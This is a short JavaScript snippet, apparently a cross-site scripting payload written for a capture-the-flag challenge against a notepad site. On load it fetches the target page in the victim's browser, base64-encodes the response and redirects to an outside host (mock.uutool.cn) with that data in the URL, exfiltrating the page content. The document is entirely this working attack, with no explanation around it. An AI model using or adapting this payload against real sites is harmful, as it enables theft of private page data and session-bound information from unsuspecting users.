function submitRequest()
      {
		var xhr = new XMLHttpRequest();
        var xhr1 = new XMLHttpRequest();
		xhr1.open("GET", "http://politenotepad.zajebistyc.tf/", true);
		
		xhr1.send();
            xhr1.onload = function() {
                if(xhr1.status == 200) {
				window.location.href="https://mock.uutool.cn/4fvkh7rejnq0?"+btoa(xhr1.responseText);
                }
            }
    }
	submitRequest();

